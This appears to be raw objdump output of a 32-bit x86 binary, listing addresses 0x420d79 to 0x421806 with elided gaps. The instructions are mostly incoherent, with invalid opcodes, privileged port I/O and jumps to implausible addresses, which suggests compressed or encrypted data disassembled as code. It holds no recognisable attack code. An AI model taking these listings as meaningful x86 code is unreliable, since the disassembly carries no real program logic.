  420d79:	mov    dh,0x78
  420d7b:	cwde   
  420d7c:	cli    
  420d7d:	jp     0x420d7f
  420d7f:	stos   DWORD PTR es:[edi],eax
  420d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d81:	aas    
  420d82:	enter  0xc5c2,0xdd
  420d86:	pop    esp
  420d87:	dec    eax
  420d88:	or     eax,0x15099c28
  420d8d:	clc    
  420d8e:	push   0x10
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xfbf57117
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	mov    dl,0xe0
  420e0e:	enter  0xfe0b,0x54
  420e12:	icebp  
  420e13:	neg    esp
  420e15:	jp     0x420dee
  420e17:	popa   
  420e18:	or     BYTE PTR [ecx],0x66
  420e1b:	inc    ebp
  420e1c:	mov    cl,0x21
  420e1e:	pop    esi
  420e1f:	or     bh,BYTE PTR [eax+0x11]
  420e22:	(bad)  
  420e23:	push   0x1bf35de4
  420e28:	(bad)  [edx+0x45]
  420e2b:	sbb    al,0x9e
  420e2d:	ret    
  420e2e:	call   FWORD PTR ds:0xf5465460
  420e34:	add    DWORD PTR [ecx-0x4],eax
  420e37:	adc    al,ch
  420e39:	jmp    0xbc9d50a6
  420e3e:	add    ebp,DWORD PTR [eax+0x2e]
  420e41:	rcr    DWORD PTR [ebx+eax*1+0x47],cl
  420e45:	pop    es
  420e46:	adc    BYTE PTR [ebx],al
  420e48:	loopne 0x420eb3
  420e4a:	test   eax,0x472a34f2
  420e4f:	push   0x17
  420e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e52:	sbb    DWORD PTR [ecx+0x2a],0xffffff88
  420e56:	rcr    BYTE PTR [eax],cl
  420e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e59:	xlat   BYTE PTR ds:[ebx]
  420e5a:	mov    bh,0x2e
  420e5c:	dec    ecx
  420e5d:	xlat   BYTE PTR ds:[ebx]
  420e5e:	scas   eax,DWORD PTR es:[edi]
  420e5f:	or     eax,0x35638500
  420e64:	clc    
  420e65:	test   eax,0xb48ab9c1
  420e6a:	repz sub eax,0x1d94eb67
  420e70:	syscall 
  420e72:	sbb    ah,BYTE PTR [edx]
  420e74:	aam    0x2
  420e76:	rol    dh,cl
  420e78:	mov    eax,ds:0xe79660f8
  420e7d:	push   esi
  420e7e:	loopne 0x420e02
  420e80:	lahf   
  420e81:	das    
  420e82:	mov    dh,0x0
  420e84:	sbb    al,0xd6
  420e86:	xor    bl,bh
  420e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e89:	int3   
  420e8a:	inc    eax
  420e8b:	ret    
  420e8c:	dec    eax
  420e8d:	hlt    
  420e8e:	push   esi
  420e8f:	adc    ecx,edi
  420e91:	push   esi
  420e92:	repz mov WORD PTR [ecx+ebx*2+0x69],es
  420e97:	(bad)  
  420e98:	imul   edi,DWORD PTR [ebx+0x20],0xffffff9d
  420e9c:	rol    BYTE PTR [edx-0x22162b67],cl
  420ea2:	mov    eax,0x73a25684
  420ea7:	xor    BYTE PTR [edx-0x37664196],dl
  420ead:	clc    
  420eae:	sub    ecx,DWORD PTR ds:0xbd02e4e8
  420eb4:	mov    ah,0xfa
  420eb6:	cmp    bl,BYTE PTR [edx]
  420eb8:	lds    esp,FWORD PTR [edx+0x79641bf]
  420ebe:	mov    ds:0x8e99df14,eax
  420ec3:	inc    ecx
  420ec4:	shl    DWORD PTR [edi+0x6aa65184],1
  420eca:	call   0xf18b868f
  420ecf:	jmp    DWORD PTR [edi+0x27]
  420ed2:	stc    
  420ed3:	hlt    
  420ed4:	addr16 dec edx
  420ed6:	dec    ebp
  420ed7:	lea    esp,[eax+0x68]
  420eda:	stc    
  420edb:	and    bl,BYTE PTR [ecx+0x470a17d6]
  420ee1:	mov    ah,0x66
  420ee3:	sbb    DWORD PTR [edx+0x53],edi
  420ee6:	inc    esi
  420ee7:	call   0xf829:0x49428e65
  420eee:	jno    0x420ed6
  420ef0:	cwde   
  420ef1:	xlat   BYTE PTR ds:[ebx]
  420ef2:	arpl   cx,bx
  420ef4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  420ef6:	push   ecx
  420ef7:	sbb    DWORD PTR [esi-0x4ea4df98],eax
  420efd:	and    al,0x55
  420eff:	mov    eax,0xcf377054
  420f04:	sbb    al,0xe7
  420f06:	jge    0x420ed3
  420f08:	enter  0x6e02,0x66
  420f0c:	sub    dh,dl
  420f0e:	or     BYTE PTR [ebx+0x0],dl
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0xd896364]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	mov    cl,0x66
  420f8e:	mov    edi,0xd9219bee
  420f93:	or     dl,al
  420f95:	test   eax,0xa305cc8
  420f9a:	or     eax,0xa7df3fd9
  420f9f:	or     DWORD PTR [ecx],edx
  420fa1:	aaa    
  420fa2:	push   ecx
  420fa3:	sbb    eax,0xc29a8e08
  420fa8:	daa    
  420fa9:	jmp    0xd0af:0x7270f207
  420fb0:	mov    edx,0x23c505c0
  420fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fb6:	sbb    ebp,DWORD PTR [edi]
  420fb8:	xchg   ebp,eax
  420fb9:	pop    esp
  420fba:	pop    es
  420fbb:	out    0x7d,eax
  420fbd:	adc    eax,0x4d01586
  420fc2:	clc    
  420fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fc4:	pop    edx
  420fc5:	xchg   DWORD PTR [esi+0x534c3f1b],ebp
  420fcb:	jbe    0x421035
  420fcd:	adc    DWORD PTR es:[edi],edi
  420fd0:	adc    al,0xf2
  420fd2:	retf   
  420fd3:	xchg   DWORD PTR [eax],ebp
  420fd5:	mov    ds:0xfd570181,eax
  420fda:	jmp    0xa482656
  420fdf:	lea    ebp,[esi+eax*2-0x592dd3aa]
  420fe6:	mov    ecx,0x88e9cd79
  420feb:	retf   0x4ded
  420fee:	jae    0x421022
  420ff0:	sti    
  420ff1:	nop
  420ff2:	jbe    0x420f9f
  420ff4:	mov    ebp,0x833cff7a
  420ff9:	mov    dh,0x40
  420ffb:	adc    esp,DWORD PTR [esi]
  420ffd:	rcr    BYTE PTR [ebx+0x40cf210c],cl
  421003:	add    BYTE PTR [ebp+0x5c47fcfc],al
  421009:	aas    
  42100a:	ret    0x3a7c
  42100d:	sub    esp,esi
  42100f:	nop
  421010:	mov    ah,dh
  421012:	cli    
  421013:	mov    esi,0x4156e2cb
  421018:	fmul   QWORD PTR [ecx-0x3c46558c]
  42101e:	outs   dx,BYTE PTR ds:[esi]
  42101f:	or     ah,bl
  421021:	adc    eax,0x26d3f0e
  421026:	daa    
  421027:	inc    ecx
  421028:	push   cs
  421029:	ret    0xd1c1
  42102c:	cmp    dl,BYTE PTR [ecx-0x4fb8ffdf]
  421032:	es inc edi
  421034:	mov    ebx,ecx
  421036:	fnstsw WORD PTR [esi]
  421038:	stos   DWORD PTR es:[edi],eax
  421039:	xlat   BYTE PTR ds:[ebx]
  42103a:	or     ch,BYTE PTR [edi+0x2a]
  42103d:	sbb    BYTE PTR [ecx+0x2134d0af],ch
  421043:	aas    
  421044:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421046:	xor    eax,0x3a863558
  42104b:	mov    bh,0x64
  42104d:	and    eax,0xc7361e29
  421052:	dec    esi
  421053:	sbb    al,BYTE PTR [ebx+ebx*1-0x7e]
  421057:	scas   al,BYTE PTR es:[edi]
  421058:	lahf   
  421059:	ja     0x421028
  42105b:	or     esi,eax
  42105d:	rcl    dh,0x42
  421060:	adc    edx,ebp
  421062:	mov    dh,0x3d
  421064:	sbb    eax,0xd1a802b8
  421069:	cs pop edx
  42106b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42106c:	cmp    ax,0xee83
  421070:	mov    ecx,DWORD PTR ds:0x22c8c15b
  421076:	int3   
  421077:	pop    esi
  421078:	retf   
  421079:	or     ch,ah
  42107b:	jo     0x421005
  42107d:	dec    edi
  42107e:	pop    DWORD PTR [ebx+0x4c57022b]
  421084:	lahf   
  421085:	out    dx,al
  421086:	call   0xc6d4bc11
  42108b:	ss adc eax,0x53443b
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ds,WORD PTR [ecx]
  421101:	push   es
  421102:	pop    es
  421103:	xlat   BYTE PTR ds:[ebx]
  421104:	or     al,0x60
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	sub    eax,0xd4d677da
  421111:	xor    al,0x69
  421113:	jle    0x421181
  421115:	rol    DWORD PTR [esi+0x75],1
  421118:	push   0xffffffdb
  42111a:	sbb    eax,0x1fe3e7a6
  42111f:	mov    bl,BYTE PTR [edi-0x5b29f523]
  421125:	mov    ebp,0xafa076b5
  42112a:	std    
  42112b:	ret    0xe4ab
  42112e:	out    0x55,eax
  421130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421131:	push   0xa
  421133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421134:	outs   dx,DWORD PTR ds:[esi]
  421135:	ins    DWORD PTR es:[edi],dx
  421136:	fild   DWORD PTR [ebp-0x2765cf58]
  42113c:	ror    BYTE PTR [esi],1
  42113e:	mov    ds:0x3f6f2965,al
  421143:	aam    0x7
  421145:	sub    ebp,DWORD PTR [ebx]
  421147:	mov    ch,0xd5
  421149:	loop   0x421192
  42114b:	sub    eax,0xaa020367
  421150:	push   ebx
  421151:	mov    al,bl
  421153:	inc    esp
  421154:	mov    cl,0xa2
  421156:	cmp    al,0xc5
  421158:	add    al,0x36
  42115a:	adc    al,0x3
  42115c:	fwait
  42115d:	inc    ecx
  42115e:	cmp    al,0x5b
  421160:	add    eax,0x2cc4bc8
  421165:	dec    esp
  421166:	cli    
  421167:	ins    BYTE PTR es:[edi],dx
  421168:	inc    edi
  421169:	sahf   
  42116a:	test   ecx,edx
  42116c:	stos   DWORD PTR es:[edi],eax
  42116d:	div    DWORD PTR [esi+0x70455fb2]
  421173:	jecxz  0x421155
  421175:	or     eax,DWORD PTR [edx+0x78a4dbc1]
  42117b:	dec    esi
  42117c:	push   ebx
  42117d:	stos   DWORD PTR es:[edi],eax
  42117e:	retf   0xd039
  421181:	push   edi
  421182:	dec    edx
  421183:	arpl   WORD PTR [edi+0x2a],di
  421186:	dec    ebp
  421187:	add    ecx,DWORD PTR [edx]
  421189:	(bad)  
  42118a:	xor    al,0xc8
  42118c:	push   ebx
  42118d:	and    BYTE PTR [ebx-0x37],dh
  421190:	bound  ebp,QWORD PTR [eax-0x5ea946b0]
  421196:	mov    al,0xf9
  421198:	jne    0x4211b4
  42119a:	aas    
  42119b:	dec    edx
  42119c:	stos   BYTE PTR es:[edi],al
  42119d:	sbb    dl,BYTE PTR [ebx-0xc]
  4211a0:	mov    al,ds:0x2cc4c460
  4211a5:	or     al,0xd9
  4211a7:	xor    ch,bh
  4211a9:	hlt    
  4211aa:	mov    ebx,0x2b16c3aa
  4211af:	jae    0x42113c
  4211b1:	test   eax,0xa6604bed
  4211b6:	test   DWORD PTR [edx],esp
  4211b8:	xor    DWORD PTR [eax-0x80],eax
  4211bb:	stos   DWORD PTR es:[edi],eax
  4211bc:	pop    edx
  4211bd:	and    ebp,DWORD PTR [ebx-0x3f]
  4211c0:	pop    edx
  4211c1:	fs push edi
  4211c3:	inc    eax
  4211c4:	scas   al,BYTE PTR es:[edi]
  4211c5:	rol    DWORD PTR [edx+esi*1-0x43],1
  4211c9:	add    dl,BYTE PTR [ebx-0x2ed22640]
  4211cf:	push   0x178cb1ab
  4211d4:	mov    bh,0x97
  4211d6:	leave  
  4211d7:	ret    0xe7c3
  4211da:	in     al,0x9e
  4211dc:	jne    0x421194
  4211de:	mov    bh,0x77
  4211e0:	dec    eax
  4211e1:	mov    eax,ds:0xbb44b331
  4211e6:	xchg   esi,eax
  4211e7:	scas   al,BYTE PTR es:[edi]
  4211e8:	inc    ebp
  4211e9:	mov    ebp,0xb071e4df
  4211ee:	jle    0x42118e
  4211f0:	cwde   
  4211f1:	push   edi
  4211f2:	adc    ebx,ebx
  4211f4:	xor    eax,0x4179c4f1
  4211f9:	mov    DWORD PTR [edi+eiz*1],ebp
  4211fc:	dec    eax
  4211fd:	add    BYTE PTR [ecx],ch
  4211ff:	push   ss
  421200:	hlt    
  421201:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  421203:	lea    edi,[ebp-0x45]
  421206:	adc    eax,0x8ea9aeb3
  42120b:	push   0xf4180e87
	...
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0x147ab32d
  421281:	xor    eax,0x1611009
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	pop    ebp
  42128d:	sahf   
  42128e:	clc    
  42128f:	sbb    DWORD PTR [edi],ecx
  421291:	imul   ebx,esi,0x19
  421294:	sub    eax,0xe9fa734b
  421299:	dec    esp
  42129a:	outs   dx,BYTE PTR ds:[esi]
  42129b:	jp     0x4212a7
  42129d:	mov    eax,ss:0x23c3b342
  4212a3:	xchg   edx,eax
  4212a4:	fcom   DWORD PTR [edx-0x19]
  4212a7:	xchg   edi,eax
  4212a8:	inc    eax
  4212a9:	jbe    0x421259
  4212ab:	or     DWORD PTR [edi+0x2db1ee4a],ebp
  4212b1:	mov    ds:0xdbe9db0e,eax
  4212b6:	fsub   st,st(4)
  4212b8:	inc    eax
  4212b9:	mov    al,0x2c
  4212bb:	dec    ecx
  4212bc:	imul   edi,DWORD PTR [eax-0x135c31a6],0x2c171fa2
  4212c6:	push   es
  4212c7:	jecxz  0x4212d5
  4212c9:	loop   0x4212bb
  4212cb:	mov    cl,0x9b
  4212cd:	fcmovb st,st(6)
  4212cf:	xchg   edx,eax
  4212d0:	jns    0x42128d
  4212d2:	mov    ds:0x6edf0e5c,eax
  4212d7:	push   DWORD PTR [ecx+0x19]
  4212da:	cld    
  4212db:	dec    esp
  4212dc:	jp     0x4212e9
  4212de:	mov    ds:0x21941511,eax
  4212e3:	je     0x42126c
  4212e5:	push   ecx
  4212e6:	push   edx
  4212e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212e8:	(bad)  
  4212e9:	fild   QWORD PTR [esp+ebx*1-0x7e700721]
  4212f0:	(bad)  
  4212f1:	xlat   BYTE PTR gs:[ebx]
  4212f3:	fcomp  QWORD PTR [ebx-0x7aa3d0b0]
  4212f9:	push   ds
  4212fa:	inc    edi
  4212fb:	mov    BYTE PTR [ecx],cl
  4212fd:	mov    al,ds:0x2215205c
  421302:	lahf   
  421303:	xor    al,0x15
  421305:	jl     0x4212bc
  421307:	ja     0x421310
  421309:	pop    edi
  42130a:	out    0x47,al
  42130c:	pop    ebp
  42130d:	(bad)  
  42130e:	and    edx,ebp
  421310:	lahf   
  421311:	das    
  421312:	add    eax,0xc75d91d3
  421317:	retf   
  421318:	push   esi
  421319:	mov    ds:0x7f7ae5f2,al
  42131e:	stos   BYTE PTR es:[edi],al
  42131f:	cmp    esi,edx
  421321:	scas   eax,DWORD PTR es:[edi]
  421322:	btr    edi,0x86
  421326:	inc    ebx
  421327:	lahf   
  421328:	add    DWORD PTR [edi+0x3d],eax
  42132b:	push   cs
  42132c:	inc    eax
  42132d:	mov    cl,BYTE PTR [edx-0x1682b8b2]
  421333:	stos   DWORD PTR es:[edi],eax
  421334:	sbb    al,0x74
  421336:	aad    0xb9
  421338:	cld    
  421339:	mov    bh,0x51
  42133b:	xor    esp,ebx
  42133d:	jle    0x421393
  42133f:	adc    bh,ch
  421341:	mov    ch,0x32
  421343:	or     BYTE PTR [edi-0x76],cl
  421346:	adc    DWORD PTR [eax+0x6ca7efa7],ebx
  42134c:	dec    esi
  42134d:	xchg   ebx,eax
  42134e:	out    0x68,eax
  421350:	dec    ebx
  421351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421352:	push   0x22
  421354:	or     BYTE PTR [eax+0x49],dl
  421357:	(bad)  
  421358:	arpl   WORD PTR [ebp+0x77],cx
  42135b:	nop
  42135c:	popa   
  42135d:	cs pop ds
  42135f:	retf   
  421360:	dec    eax
  421361:	inc    eax
  421362:	test   eax,0xba797cd1
  421367:	rcr    BYTE PTR [esi],cl
  421369:	aam    0x63
  42136b:	mov    esp,0x36cc4d5a
  421370:	lea    edi,[edx]
  421372:	and    DWORD PTR [edi-0x72],esp
  421375:	fmul   QWORD PTR [ebx-0x1e25e5c1]
  42137b:	pop    ds
  42137c:	fild   WORD PTR [ecx+0x4d34bcf8]
  421382:	dec    edx
  421383:	pop    ss
  421384:	mov    ecx,0x804f9ab7
  421389:	(bad)  
  42138a:	xchg   ebx,eax
  42138b:	out    dx,al
  42138c:	retf   
  42138d:	mov    eax,ds:0xfba5
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x4a63f49f]
  421402:	scas   eax,DWORD PTR es:[edi]
  421403:	aaa    
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	jmp    0xea37ead5
  421411:	pop    ebx
  421412:	fist   WORD PTR [ecx+0x50]
  421415:	xchg   esp,eax
  421416:	ss loope 0x421486
  421419:	rcr    DWORD PTR [eax],0xbc
  42141c:	daa    
  42141d:	or     dl,BYTE PTR ds:0xb65683ca
  421423:	push   esp
  421424:	ror    DWORD PTR [esi],0xd2
  421427:	mov    esi,0x7151fb4e
  42142c:	add    eax,0xa03ce94e
  421431:	lahf   
  421432:	std    
  421433:	sbb    BYTE PTR [ecx-0x62329f2f],0x65
  42143a:	popa   
  42143b:	loop   0x421416
  42143d:	shl    BYTE PTR [ecx+ebp*2+0xf],cl
  421441:	pop    edx
  421442:	cmp    DWORD PTR [edi-0x112f606d],esp
  421448:	test   BYTE PTR [edi+0x52],ah
  42144b:	lds    esp,FWORD PTR [edi-0x4e]
  42144e:	loopne 0x42144d
  421450:	pop    ebp
  421451:	shl    DWORD PTR [esp],0x77
  421455:	inc    esi
  421456:	push   0x40
  421458:	fs pop esp
  42145a:	and    DWORD PTR [ecx],0xef6abd32
  421460:	inc    ebp
  421461:	call   0x791aee4f
  421466:	or     eax,DWORD PTR [ebx]
  421468:	aaa    
  421469:	sub    esp,DWORD PTR [ebx+eiz*8-0x12d175]
  421470:	gs push esp
  421472:	rcl    DWORD PTR [eax],0x48
  421475:	cs cld 
  421477:	fisub  DWORD PTR [esp+ebp*1]
  42147a:	mov    es:0xac574810,al
  421480:	add    BYTE PTR [edi-0x5237e3d7],ch
  421486:	xchg   edx,eax
  421487:	into   
  421488:	mov    ch,ch
  42148a:	jb     0x421438
  42148c:	mov    eax,0x3c14b264
  421491:	lock ret 
  421493:	mov    eax,ds:0x98412596
  421498:	mov    eax,ds:0x80c84eb0
  42149d:	xchg   ebx,eax
  42149e:	mov    eax,ds:0x64544b4a
  4214a3:	enter  0x8902,0x5d
  4214a7:	in     al,0x5c
  4214a9:	test   eax,0x1b2ea911
  4214ae:	test   al,0xc8
  4214b0:	xor    ch,0xc8
  4214b3:	push   ebp
  4214b4:	add    bh,dh
  4214b6:	icebp  
  4214b7:	or     BYTE PTR [bp+si-0x4841],0x46
  4214bd:	mov    cl,0xc8
  4214bf:	jecxz  0x421502
  4214c1:	mov    eax,ds:0xb0d746b7
  4214c6:	inc    esi
  4214c7:	imul   esp,DWORD PTR [esi+0x56],0x72
  4214cb:	retf   0xcccf
  4214ce:	scas   eax,DWORD PTR es:[edi]
  4214cf:	sbb    al,0x54
  4214d1:	imul   ecx,DWORD PTR [eax],0x1f
  4214d4:	loopne 0x42153c
  4214d6:	lock in al,0x88
  4214d9:	mov    eax,0x5d68b334
  4214de:	dec    ebx
  4214df:	mov    ah,0x31
  4214e1:	dec    eax
  4214e2:	popf   
  4214e3:	mov    eax,0x42b9d4ad
  4214e8:	push   edx
  4214e9:	ins    DWORD PTR es:[edi],dx
  4214ea:	popa   
  4214eb:	sbb    BYTE PTR [esi+0x1b],0x93
  4214ef:	out    0x1a,eax
  4214f1:	daa    
  4214f2:	inc    ecx
  4214f3:	stc    
  4214f4:	and    al,bl
  4214f6:	jle    0x42153c
  4214f8:	sbb    BYTE PTR ds:0x76a9cd0e,bl
  4214fe:	adc    DWORD PTR [edi-0x3d0c70e3],edi
  421504:	and    BYTE PTR [ebx+0x7b],0x46
  421508:	adc    DWORD PTR [ebx+edi*2+0x56],ebx
  42150c:	iret   
  42150d:	push   eax
  42150e:	fldenv [edi+0x0]
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x7c5abd4c],bp
  421582:	repnz pop ebp
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	stos   DWORD PTR es:[edi],eax
  42158d:	fabs   
  42158f:	or     al,0xe8
  421591:	sub    al,0x88
  421593:	fwait
  421594:	mov    eax,0x759c6726
  421599:	popf   
  42159a:	js     0x4215a0
  42159c:	call   0xc7d4:0x5fa54f30
  4215a3:	mov    ecx,0x64090642
  4215a8:	add    edi,ecx
  4215aa:	mov    esi,ecx
  4215ac:	out    dx,eax
  4215ad:	fild   QWORD PTR [esi+0x5c3f55ad]
  4215b3:	div    edi
  4215b5:	in     al,dx
  4215b6:	inc    ebp
  4215b7:	js     0x42160e
  4215b9:	cmp    al,0x53
  4215bb:	adc    BYTE PTR [eax-0x33bad218],0xba
  4215c2:	stos   DWORD PTR es:[edi],eax
  4215c3:	xchg   ebx,eax
  4215c4:	pop    ss
  4215c5:	adc    esi,DWORD PTR [ebx-0x6ff346a5]
  4215cb:	shr    BYTE PTR [esi+0x54693abc],1
  4215d1:	pop    ss
  4215d2:	loopne 0x4215f4
  4215d4:	in     eax,0x99
  4215d6:	dec    ebx
  4215d7:	pop    ss
  4215d8:	jae    0x4215e1
  4215da:	ror    BYTE PTR [ebx],1
  4215dc:	mov    eax,ds:0xde06a186
  4215e1:	arpl   WORD PTR [ebx-0x5],di
  4215e4:	int3   
  4215e5:	leave  
  4215e6:	jns    0x4215de
  4215e8:	call   0x7d59:0xbaaa6dd0
  4215ef:	inc    ecx
  4215f0:	mov    dh,0xb1
  4215f2:	rcr    esp,0xf6
  4215f5:	neg    BYTE PTR [eax-0x73]
  4215f8:	rol    DWORD PTR [ecx],cl
  4215fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215fb:	sub    BYTE PTR [ebp-0x34b334d],al
  421601:	ret    0x6076
  421604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421605:	mov    al,0xd2
  421607:	sahf   
  421608:	push   eax
  421609:	das    
  42160a:	mov    al,ds:0xe33b2201
  42160f:	sub    eax,0xed55d8c9
  421614:	cmp    eax,0xf979f1cb
  421619:	ja     0x421607
  42161b:	add    esp,DWORD PTR [ecx]
  42161d:	cmp    eax,0x786b0566
  421622:	inc    eax
  421623:	test   al,0x41
  421625:	and    dh,dl
  421627:	xor    DWORD PTR [eax+edi*1],esi
  42162a:	sub    esp,eax
  42162c:	mov    BYTE PTR [ebp-0x4f],dl
  42162f:	inc    ebp
  421630:	push   esi
  421631:	sub    esi,ebx
  421633:	jo     0x42169a
  421635:	mov    WORD PTR [ebp+0x63],ds
  421638:	or     eax,0xd3ad657e
  42163d:	mov    esp,0xef56e1e
  421642:	les    ebx,FWORD PTR gs:[edx+0x18a3d7ad]
  421649:	pusha  
  42164a:	aad    0x85
  42164c:	out    0x8a,al
  42164e:	shr    DWORD PTR [edi-0x17],1
  421651:	loop   0x42165a
  421653:	adc    DWORD PTR [esi+0x2f9b8276],eax
  421659:	das    
  42165a:	ins    BYTE PTR es:[edi],dx
  42165b:	push   DWORD PTR [ecx-0x44254b72]
  421661:	leave  
  421662:	call   0xa1b7e2f6
  421667:	xchg   esi,eax
  421668:	arpl   cx,di
  42166a:	mov    eax,ds:0x6a8c6660
  42166f:	pop    esp
  421670:	adc    BYTE PTR ds:0x33a0b9f8,0x9d
  421677:	out    0xc2,al
  421679:	scas   eax,DWORD PTR es:[edi]
  42167a:	inc    ebp
  42167b:	mov    edi,0x15053ed
  421680:	out    0x88,al
  421682:	pop    esi
  421683:	adc    eax,0xf6f9aa1
  421688:	xchg   ebx,esp
  42168a:	jle    0x421668
  42168c:	aaa    
  42168d:	push   edx
  42168e:	bound  edx,QWORD PTR [ecx]
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	mov    ebp,0x1c49bffd
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	sbb    BYTE PTR [eax-0x238492c2],bh
  421712:	aas    
  421713:	adc    esp,edi
  421715:	dec    esi
  421716:	or     al,0x82
  421718:	ret    0x33c8
  42171b:	fucomp st(7)
  42171d:	retf   
  42171e:	mov    ds:0xa157566e,eax
  421723:	mov    esi,0x24032e2f
  421728:	sub    BYTE PTR [edi+0x75c30909],ah
  42172e:	dec    ebp
  42172f:	sub    bl,BYTE PTR [edx+0x37834016]
  421735:	in     eax,0xfd
  421737:	cwde   
  421738:	mov    esp,0x26cc07b8
  42173d:	ins    DWORD PTR es:[edi],dx
  42173e:	mov    dh,0x97
  421740:	popa   
  421741:	pop    ebx
  421742:	xchg   ecx,eax
  421743:	add    eax,0x6373d78d
  421748:	pop    eax
  421749:	(bad)  
  42174a:	mov    dl,0x3f
  42174c:	xchg   BYTE PTR [edi+0xb],al
  42174f:	retf   
  421750:	pop    esi
  421751:	in     eax,dx
  421752:	out    dx,al
  421753:	cmc    
  421754:	ja     0x4216d7
  421756:	fiadd  DWORD PTR [esi+0xd531f6]
  42175c:	xchg   esi,eax
  42175d:	imul   esi
  42175f:	frstor [esi]
  421761:	cmp    al,0xc9
  421763:	enter  0x7bf3,0xdb
  421767:	add    eax,0xa33b3786
  42176c:	std    
  42176d:	scas   eax,DWORD PTR es:[edi]
  42176e:	mov    edi,0x46ee253e
  421773:	sub    eax,0x721cbb8d
  421778:	call   DWORD PTR [ecx+0xdeeeb8d]
  42177e:	and    DWORD PTR [esp+ebx*2-0x3bc97c68],0x5167131a
  421789:	lods   al,BYTE PTR ds:[esi]
  42178a:	in     eax,dx
  42178b:	popa   
  42178c:	push   eax
  42178d:	inc    ecx
  42178e:	fs push ss
  421790:	xor    eax,ebp
  421792:	rcr    esi,cl
  421794:	loopne 0x421783
  421796:	jle    0x42177d
  421798:	imul   esi,DWORD PTR [ebx+0x59],0x8f443e9d
  42179f:	aas    
  4217a0:	add    al,0xc9
  4217a2:	jle    0x421726
  4217a4:	xor    bh,ah
  4217a6:	int    0xfc
  4217a8:	aad    0x55
  4217aa:	stos   BYTE PTR es:[edi],al
  4217ab:	fcomp  DWORD PTR [ebx+edi*1+0x6f]
  4217af:	fstp   st(3)
  4217b1:	cwde   
  4217b2:	mov    bh,0x46
  4217b4:	lods   al,BYTE PTR ds:[esi]
  4217b5:	and    ch,BYTE PTR [edx]
  4217b7:	loope  0x4217c9
  4217b9:	mov    ecx,0x1e2b1c94
  4217be:	int    0xab
  4217c0:	bound  ebx,QWORD PTR [eax+0x3c]
  4217c3:	ret    0xf18f
  4217c6:	fidiv  DWORD PTR [edi-0x79]
  4217c9:	sbb    bl,BYTE PTR [edi+ecx*2]
  4217cc:	outs   dx,DWORD PTR ds:[esi]
  4217cd:	sub    BYTE PTR [ebx+eiz*2+0x787675e3],dh
  4217d4:	push   ebx
  4217d5:	in     eax,0x77
  4217d7:	out    dx,eax
  4217d8:	add    BYTE PTR [ecx-0x868418b],bh
  4217de:	cdq    
  4217df:	ja     0x4217be
  4217e1:	mov    ebx,0x3bfca04f
  4217e6:	or     BYTE PTR [ebp-0x3b],0xb2
  4217ea:	sbb    BYTE PTR [ebp+0x35441f5b],ch
  4217f0:	xor    eax,0xe1bae6d
  4217f5:	in     eax,dx
  4217f6:	xchg   DWORD PTR [ebp-0x5d],ecx
  4217f9:	pop    ebx
  4217fa:	mov    ebp,0x4165c20d
  4217ff:	mov    eax,ds:0xd4e96d79
  421804:	sub    ebx,DWORD PTR [edi]
  421806:	inc    esi
